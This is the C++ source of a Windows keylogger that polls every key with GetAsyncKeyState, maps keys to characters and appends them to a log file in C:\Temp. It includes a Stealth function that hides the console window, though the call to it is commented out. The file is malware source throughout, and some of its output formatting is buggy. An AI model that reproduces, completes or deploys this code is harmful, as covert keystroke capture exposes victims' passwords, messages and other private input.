#define _CRT_SECURE_NO_WARNINGS
#include <iostream>    // These we need to
//#include <stdio.h>
#include <windows.h>   // Keylogger working.
//#include <winuser.h>
#include <vector>
#pragma comment(lib, "user32.lib")

int Save(int key_stroke, char *file);
void Stealth();
using namespace std;   // include to get our

vector<HANDLE> threads = vector<HANDLE>();

DWORD WINAPI keylog(LPVOID lpParameter);

int main(){

	DWORD myThreadID;
	HANDLE threadHandle = CreateThread(0, 1024, keylog, NULL, 0, &myThreadID);
	DWORD myThreadID2;
	HANDLE threadHandle2 = CreateThread(0, 1024, keylog, NULL, 0, &myThreadID2);
  // CreateThread returns null on failure
  if(threadHandle != NULL){
    threads.push_back(threadHandle);
  }
	if(threadHandle2 != NULL){
    threads.push_back(threadHandle2);
  }
	LPDWORD retVal = 0;
	GetExitCodeThread(threadHandle, retVal);
	printf("handle 1: %d\n", retVal);
	GetExitCodeThread(threadHandle2, retVal);
	printf("handle 2: %d\n", retVal);
	printf("number of threads: %d\n", threads.size());

  system("pause");

  // clean up and close all threads
  while(threads.size() > 0){
    CloseHandle(threads.back());
    threads.pop_back();
  }
	system("PAUSE");
	return 0;
}

DWORD WINAPI keylog(LPVOID lpParameter){
	const char* mutexName = "keylogger";
  HANDLE mHandle = CreateMutex(NULL, true, mutexName);
  if(GetLastError() == ERROR_ALREADY_EXISTS){
    printf("Mutex already locked\n");
    return 1;
  }

	printf("keylogging\n");
	//SetPriorityClass( GetCurrentProcess(), HIGH_PRIORITY_CLASS);

	//Stealth();

	while (1){
		for (char i = 8; i <= 190; i++){
			if (GetAsyncKeyState(i) == -32767) 				Save(i, "C:\\Temp\\Data.txt");
			if (GetAsyncKeyState(VK_OEM_3) == -32767) 		Save(191, "C:\\Temp\\Data.txt"); //`~
			if (GetAsyncKeyState(VK_OEM_MINUS) == -32767) 	Save(192, "C:\\Temp\\Data.txt"); // -_
			if (GetAsyncKeyState(VK_OEM_PLUS) == -32767) 	Save(193, "C:\\Temp\\Data.txt"); //=+
			if (GetAsyncKeyState(VK_OEM_4) == -32767) 		Save(194, "C:\\Temp\\Data.txt"); // [{
			if (GetAsyncKeyState(VK_OEM_6) == -32767) 		Save(195, "C:\\Temp\\Data.txt"); // ]}
			if (GetAsyncKeyState(VK_OEM_5) == -32767) 		Save(196, "C:\\Temp\\Data.txt"); // \|
			if (GetAsyncKeyState(VK_OEM_1) == -32767) 		Save(197, "C:\\Temp\\Data.txt"); // ;:
			if (GetAsyncKeyState(VK_OEM_7) == -32767) 		Save(198, "C:\\Temp\\Data.txt"); // '"
			if (GetAsyncKeyState(VK_OEM_COMMA) == -32767) 	Save(199, "C:\\Temp\\Data.txt"); // ,<
			if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767) 	Save(200, "C:\\Temp\\Data.txt"); // .>
			if (GetAsyncKeyState(VK_OEM_2) == -32767) 		Save(201, "C:\\Temp\\Data.txt"); // /?
		}
	}

	// release Mutex
	ReleaseMutex(mHandle);
}

int Save(int key_stroke, char *file){
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	const string A[] = {"[Backspace]","[Tab]","","","[Clear]","[Enter]\n","","","","[Ctrl]","[Alt]","","","","","","","","","[Esc]","","","","","[Space]","[Pg Up]","[Pg Dn]","[End]","[Home]","[Left]","[Up]", "[Right]","[Down]","","","","[Prnt Scr]","[Insert]","[Del]",""};
	const string B[] = {"~","_","+","{","}","|",":","\"","<",">","?","`","-","=","[","]","\\",";","'",",",".","/",")","!","@","#","$","%","^","&","*","("};

	cout << key_stroke << endl;

	//special characters
	if 		(key_stroke >= 8 && key_stroke <= 46){			  key_stroke = key_stroke - 8;	fprintf(OUTPUT_FILE, "%s", &A[key_stroke]); }
	else if (key_stroke == VK_RWIN || key_stroke == VK_LWIN)								fprintf(OUTPUT_FILE, "%s", "[Win]");

	//virtual OEM keys
	else if (key_stroke >= 191){
		key_stroke = key_stroke - 191;
		((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", &B[key_stroke]):fprintf(OUTPUT_FILE, "%s", &B[key_stroke+11]));
	}

	//numpad 0-9
	else if (key_stroke >= 96 && key_stroke <= 105){
		key_stroke = key_stroke - 48;
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}

	//numpad symbols
	else if (key_stroke == VK_MULTIPLY) fprintf(OUTPUT_FILE, "%s", "*");
	else if (key_stroke == VK_ADD) 		fprintf(OUTPUT_FILE, "%s", "+");
	else if (key_stroke == VK_SUBTRACT) fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == VK_DIVIDE) 	fprintf(OUTPUT_FILE, "%s", "/");

	//Function keys (F#)
	else if(key_stroke >= 112 && key_stroke <=135)  fprintf(OUTPUT_FILE, "%s", "");

	//period
	else if (key_stroke == 190 || key_stroke == 110)fprintf(OUTPUT_FILE, "%s", ".");

	//symbols
	else if(key_stroke >= 48 && key_stroke <= 57){
		//shift special characters 0-9
		if(GetAsyncKeyState(VK_SHIFT) == -32768){
			key_stroke = key_stroke - 26;
			fprintf(OUTPUT_FILE, "%s", &B[key_stroke]);
		}else fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}

	//alphabet
	else if (key_stroke >= 65 && key_stroke <= 90){
		if 		((GetKeyState(VK_CAPITAL) & 0x0001) != 0 && GetAsyncKeyState(VK_SHIFT) != -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && GetAsyncKeyState(VK_SHIFT) == -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else{	key_stroke = key_stroke + 32;fprintf(OUTPUT_FILE, "%s", &key_stroke);}
	}

	//other
	else	fprintf(OUTPUT_FILE, "%s", &key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth(){
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}
